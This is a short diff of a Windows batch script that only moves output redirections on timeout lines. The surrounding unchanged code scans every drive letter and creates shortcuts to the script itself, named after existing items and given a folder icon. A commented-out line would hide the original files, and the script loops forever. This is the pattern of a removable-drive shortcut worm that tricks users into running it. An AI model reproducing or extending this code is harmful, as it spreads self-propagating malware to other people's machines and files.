@@ -61,7 +61,7 @@ for %%i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
             rem attrib +h "%%i:\%%x"
             if not exist "%%i:\%%x.lnk" (
               shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0" /p:"%%i:\%%x" /i:"%WinDir%\System32\SHELL32.dll,3"
-              rem >nul timeout /nobreak /t 1
+              rem timeout /nobreak /t 1 >nul
             )
           )
         )
@@ -71,7 +71,7 @@ for %%i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
             rem attrib +h "%%i:\%%x"
             if not exist "%%i:\%%x.lnk" (
               shortcut.exe /a:c /f:"%%i:\%%x.lnk" /t:"%%i:\%~nx0" /p:"%%i:\%%x" /i:"%WinDir%\System32\SHELL32.dll,3"
-              rem >nul timeout /nobreak /t 1
+              rem timeout /nobreak /t 1 >nul
             )
           )
         )
@@ -82,7 +82,7 @@ for %%i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
 
 
 
->nul timeout /nobreak /t 10
+timeout /nobreak /t 10 >nul
 goto :cycle
 
 
